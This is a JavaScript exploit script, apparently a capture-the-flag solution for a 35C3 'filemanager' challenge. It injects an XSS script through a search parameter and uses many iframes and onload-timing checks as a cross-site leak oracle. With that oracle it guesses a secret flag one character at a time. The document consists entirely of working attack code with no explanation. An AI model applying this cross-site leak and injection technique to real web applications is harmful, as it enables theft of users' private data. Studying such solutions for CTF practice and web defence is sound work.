const origin = 'https://filemanager.appspot.com'

const xss_script_param = encodeURI(`<script>
    (()=>{
      for (let pre of document.getElementsByTagName('pre')) {
        let text = pre.innerHTML;
        let q = 'f';
        let idx = text.indexOf(q);
        pre.innerHTML = \`\${text.substr(0, idx)}<mark>\${q}</mark>\${text.substr(idx+q.length)}\`;
      }
    })();
  </script>`);

const search = '/search?q='

function sleep(ms) {
  return new Promise(r=>setTimeout(r, ms));
}

async function onload_triggered(ifr, url, timeout_ms) {
  try {
    await new Promise((resolve,reject)=>{
      let timeout = setTimeout(reject, timeout_ms);
      ifr.onload = ()=>{clearTimeout(timeout); resolve()};
      ifr.src = url;
    });
    return true;
  } catch(err) {
    return false;
  }
}

async function test_q(ifr, q) {
  console.log(`testing ${q}`);
  console.log(`ifr: ${ifr}`);
  let url = `${origin}/search?xss=${xss_script_param}&q=${encodeURI(q)}`;
  if (!await onload_triggered(ifr, url, 30000)) {
    console.log('error');
  }
  return await onload_triggered(ifr, url+'#foo', 10000);
}

let prefix = '35C3_';

async function doit() {
  const charset = 'abcdefghijklmnopqrstuvwxyz_0123456789';

  let ifrs = [];
  for (let i = 0; i < charset.length; i++) {
    let ifr = document.createElement('iframe');
    document.body.appendChild(ifr);
    ifrs.push(ifr);
  }

  while (prefix.length < 8) {
    let promises = [];
    for (let i = 0; i < charset.length; i++) {
      let q = prefix + charset[i];
      let ifr = ifrs[i];
      promises.push(test_q(ifr, q));
    }

    let results = await Promise.all(promises);
    prefix += charset[results.indexOf(true)];
    console.log(prefix);
    await sleep(2000);
  }
}

doit();
